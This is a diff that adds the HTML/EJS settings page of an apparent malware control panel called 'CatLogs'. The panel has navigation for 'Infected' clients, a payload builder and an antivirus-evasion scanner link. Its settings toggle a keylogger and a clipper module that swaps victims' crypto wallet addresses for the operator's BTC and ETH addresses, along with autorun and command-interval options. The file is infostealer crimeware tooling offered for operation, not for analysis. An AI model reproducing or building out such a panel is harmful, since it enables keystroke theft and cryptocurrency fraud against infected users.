@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <title>CatLogs – Settings</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="The best password recovery tool">
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="googlebot" content="noindex">
+    <meta name="googlebot-news" content="nosnippet">
+    <link rel="stylesheet" href="../../assets/style.css">
+    <link rel="stylesheet" href="../../assets/boxicons.css">
+    <script src="../../assets/jquery.js"></script>
+</head>
+
+<body cz-shortcut-listen="true">
+    <div class="sidebar">
+        <div class="logo-details">
+           <img class="logo" src="../../assets/cat.png" alt="DuckLogs">
+           <span class="logo_name">CatLogs</span>
+        </div>
+        <ul class="nav-links">
+           <li>
+              <a href="/dashboard">
+                 <i class="bx bx-grid-alt"></i>
+                 <span class="link_name">Dashboard</span>
+              </a>
+              <ul class="sub-menu blank">
+                 <li><a class="link_name" href="/dashboard">Dashboard</a></li>
+              </ul>
+           </li>
+           <li>
+              <div class="iocn-link">
+                 <a href="/clients">
+                    <i class="bx bx-bug"></i>
+                    <span class="link_name">Infected</span>
+                 </a>
+                 <i class="bx bxs-chevron-down arrow"></i>
+              </div>
+              <ul class="sub-menu">
+                 <li><a class="link_name" href="/clients">Infected</a></li>
+                 <li><a href="/clients">Clients</a></li>
+              </ul>
+           </li>
+           
+           <li>
+            <div class="iocn-link">
+               <a href="/builder">
+                  <i class="bx bx-wrench"></i>
+                  <span class="link_name">Build</span>
+               </a>
+               
+            </div>
+          
+         </li>
+           <li>
+              <a href="https://antiscan.me/" target="_blank">
+                 <i class="bx bx-check-shield"></i>
+                 <span class="link_name">Scanner</span>
+              </a>
+              <ul class="sub-menu blank">
+                 <li><a class="link_name" href="https://antiscan.me/" target="_blank">Scanner</a></li>
+              </ul>
+           </li>
+           <li>
+              <div class="iocn-link">
+                 <a href="/settings">
+                    <i class="bx bx-cog"></i>
+                    <span class="link_name">Settings</span>
+                 </a>
+                 <i class="bx bxs-chevron-down arrow"></i>
+              </div>
+              <ul class="sub-menu">
+                 <li><a class="link_name" href="/settings">Settings</a></li>
+                 <li><a href="/settings">General</a></li>
+              </ul>
+           </li>
+           <li>
+           </li>
+          
+           <li>
+              <div class="profile-details">
+                 <div class="profile-content">
+                    <img src="https://www.nulled.to/uploads/profile/photo-4668197.png" alt="profileImg">
+                 </div>
+                 <div class="name-job">
+                    <div class="profile_name">Default</div>
+                    <div class="job">User</div>
+                 </div>
+                 <a href="/logout"><i class="bx bx-log-out"></i></a>
+              </div>
+           </li>
+        </ul>
+     </div>
+
+    <div class="container-builder" style="padding-top: 100px;">
+        <div class="b-settings" style="height: 670px;  margin-top: 0px;">
+            <div class="bar-upgrade">
+                <a><i class="bx bx-cog"></i> Settings</a>
+            </div>
+            <div class="info">
+                <form method="POST" action="/settings">
+
+                    <div class="settings">
+                        <div class="setting">Keylogger Module <a id="f-info"
+                                title="Automatically replace victim's crypto wallet addresses with yours.">(?)</a></div>
+                            <div>
+                                <label class="switch">
+                                <input type="checkbox" name="keylogger" id="keylogger" <%= ky %>>
+                                <span class="slider"></span>
+                                </label>
+                            </div>
+                        
+                    </div>
+                    <div class="settings">
+                        <div class="setting">Clipper Module <a id="f-info"
+                                title="Automatically replace victim's crypto wallet addresses with yours.">(?)</a></div>
+                            <div>
+                                <label class="switch">
+                                <input type="checkbox" name="clipper" id="clipper" <%= cp %>>
+                                <span class="slider"></span>
+                                </label>
+                            </div>
+                        
+                    </div>
+
+
+                    <div class="settings">
+                        <input style="margin-left: 15px;" type="text" class="input" name="btcAddy" placeholder="BTC Address" value="<%= btc %>">
+                        
+                    </div>
+
+                    <div class="settings">
+                        <input style="margin-left: 15px;" type="text" class="input" name="ethAddy" placeholder="ETH Address" value="<%= eth %>"><br/>
+                        
+                    </div>
+                    <br/>
+
+                    <div class="settings">
+                        <div class="setting">AutoRun</div>
+                            <div>
+                                <label class="switch">
+                                <input type="checkbox" name="autoR" id="autoR" <%= aR %>>
+                                <span class="slider"></span>
+                                </label>
+                            </div>
+                        
+                    </div>
+
+                    <div class="settings">
+                        <input style="margin-left: 15px;" type="text" class="input" name="sleep" placeholder="Seconds between commands" value="<%= s %>"><br/>
+                        
+                    </div>
+                    <br/>
+                    <div class="settings">
+                     <input style="margin-left: 15px;" type="text" class="input" name="nulled" placeholder="Nulled AuthKey" value="<%= n %>"><br/>
+                     
+                     </div>
+                     <br/>
+                    <input type="submit" class="button" style="margin-left: 15px;" value="Save">
+
+                    
+                </form>
+                
+            </div>
+        </div>
+    </div>
+    <script src="../../assets/sideBar.js"></script>
+
+
+</body>
+
+</html>
